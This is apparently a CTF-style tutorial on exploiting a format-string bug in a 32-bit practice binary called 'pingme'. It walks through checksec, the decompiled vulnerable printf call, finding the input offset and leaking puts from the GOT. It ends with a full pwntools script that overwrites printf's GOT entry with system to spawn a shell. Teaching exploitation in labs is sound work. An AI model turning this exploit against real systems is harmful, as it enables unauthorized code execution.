# Format String: Overwrite GOT Address


This technique is used to overwrite a GOT address(the address which points a dynamically linked function to the linked library) to that of other function. This is very useful techniques when you have a format string vulnerability and you want to change the control flow a function to something that it was not *supposed* to do. Here, we will take a binary which has a format string vulnerability and how we can use it overwrite GOT address sto that of other address. 

# Practical

***

Binary : [here](/Attachments/images/overwrite-got-fmt/other/pingme)

Exploit: [here](/Attachments/images/overwrite-got-fmt/other/pingme.py)

***


First off, we need to check the binary protections, let's use `checksec`:-

```r
d4mianwayne@oracle:~/Pwning/fmt$ checksec pingme
[*] '/home/d4mianwayne/Pwning/fmt/pingme'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

NX is enabled other than everything is disabled. One security mechanism is of interest is `RELRO` which is an abbreviation of `Relocation Read Only` which means the relocations entry is read-only i.e. the Global Offset address. To be more specific, this mechanism do not allow you to overwrite a GOT entry and prevents you from changing the control flow. You can found more information about `RELRO` [here](https://medium.com/@HockeyInJune/relro-relocation-read-only-c8d0933faef3). 

Since, here it is disabled which means we can overwrite the GOT entry. But before that let's reverse engineer the binary and see the workflow. Using IDA, `main` is:-

```C
void __cdecl __noreturn main()
{
  char format; // [esp+Ch] [ebp-4Ch]
  unsigned int v1; // [esp+4Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  initialize();
  puts("Ping me");
  while ( 1 )  <----- While `loop`
  {
    if ( getinp(&format, 64) )
    {
      printf(&format);   <---------- Format String Vulnerability
      putchar(10);
    }
    else
    {
      puts(";( ");
    }
  }
}
```

We can see that there is a format string vulnerability and the while loop is taking the input until some error occurs or we quit the program itself. The `getinp` seems to be taking input. Let's check what it do:-

```C
size_t __cdecl getinp(char *s, int n)
{
  char *v3; // [esp+Ch] [ebp-Ch]

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}
```

It's taking input and checking if the input has  a new line if it adds a null byte to the input and return the length of the string.

### Triggering the Vulnerability and Finding Offsets

Now, since we know how the program works we need to trigger the vulnerability and find the offset of the input on the stack. Let's run the program:-

```r
d4mianwayne@oracle:~/Pwning/fmt$ ./pingme 
Ping me
%x-%x-%x-%x
40-ff925b78-8048638-0
%x-%x-%x
40-ff925b78-8048638
AAAA-%x-%x-%x-%x-%x-%x-%x
AAAA-40-ff925b78-8048638-0-0-13-41414141
^C
```

Since we give `%x` and we can see that there are some hex values, then we try `AAAA` and a couple of `%x` and then we see the output `AAAA-40-ff925b78-8048638-0-0-13-41414141`, we can see that the given `AAAA` in hex value `41414141` at the offset `7`, which will be used in further exploit.

### Defeating ASLR: Leaking GOT address

Since we know that ASLR is enabled we have to leak a GOT address to calculate the address of LIBC base address, to leak an address we have to give `%8$s` and `GOT address`. Then the payload will look like this:-

```r
------------------------------
|   "%8$s" |   GOT address   |
------------------------------
```

Now, let's make a pwntools' exploit:-

```python
#!/usr/bin/python3
from pwn import *

p = process("./pingme") # Starting local process

libc = ELF("/lib/i386-linux-gnu/libc.so.6")

puts_got = 0x8049980 # GOT address of `puts`

payload = b"%8$s"      # To print the address
payload += p32(puts_got) # The address to be printed

pause()  # Pausing the execution to attach it in `gdb`
p.sendlineafter(b"me\n", payload) # Send the payload after the delimiter
puts_leak = u32(p.recv(4).strip().ljust(4, b"\x00")) # Recieve the 4 bytes, align it and then parse it accordingly.
log.info("puts@libc: "+hex(puts_leak)) # Print the hex value of the leaked `puts`
p.interactive() # Interactive mode
```

Running the exploit and continuing:-

---

![attach](/Attachments/images/overwrite-got-fmt/images/attach.png)

---

Now, continuing the process:-

---

![continue](/Attachments/images/overwrite-got-fmt/images/continue.png)


---

Let's check the `puts` address in `gdb` with `p puts` and see if it equals to what we recieved:-

---

![leak](/Attachments/images/overwrite-got-fmt/images/got-leak.png)

---

Great, we have leaked a libc address, now we need to calculate the lhe base address, we know the drill so we will use pwntools' `ELF` to update the address by subtracting the leak address from it's offset from libc.

`libc.address = puts_leak - libc.symbols['puts']`


### Pwning Time

Now, we gotta overwrite the GOT of `printf` with `system` so that if we give any input to `printf` the input will be redirected to system. For example, like if we gave `cat flag.txt` to the input the `printf` will print `cat flag.txt` but since now, it's GOT points to system, giving `cat flag.txt` will take it as a system command and read the `flag.txt` file.

We will be using `fmtstr_payload` function of pwntools to generate the payload which will be used to overwrite the GOT address of `printf` with `system`:-

```r

from pwn import *

p = process("./pingme") # Start the process
 
libc = ELF("/lib/i386-linux-gnu/libc.so.6") # pwntools' `ELF`

puts_got = 0x8049980      # `puts` GOT to leak
printf = 0x8049974        # `printf` GOT to overwrite
payload = b"%8$s"         # Leaking the GOT address
payload += p32(puts_got)  # The address to be leaked

p.sendlineafter(b"me\n", payload)                    # Send payload after the `me\n`
puts_leak = u32(p.recv(4).strip().ljust(4, b"\x00")) # Recieving 4 bytes and  unpacking it
log.info("puts@libc: "+hex(puts_leak))               # Printing the leak address as hex
 
libc.address = puts_leak - libc.symbols['puts']      # Updating the libc base by subtracting 
system = libc.symbols['system']                      # `system` address 
payload = fmtstr_payload(7, {printf:  system})       # Overwiting the GOT address of `printf` with `system` address
p.sendline(payload)                                  # Sending payload 
p.sendline(b"/bin/bash\x00")                         # Sending `/bin/bash` to spawn shell
p.interactive()                                      # Interactive mode

```

Attaching it to `gdb` and then checking the `GOT` address of `printf` we can see that it has been overwritten with the address of `system`.

---

![shell](/Attachments/images/overwrite-got-fmt/images/shell.png)


---

We are done.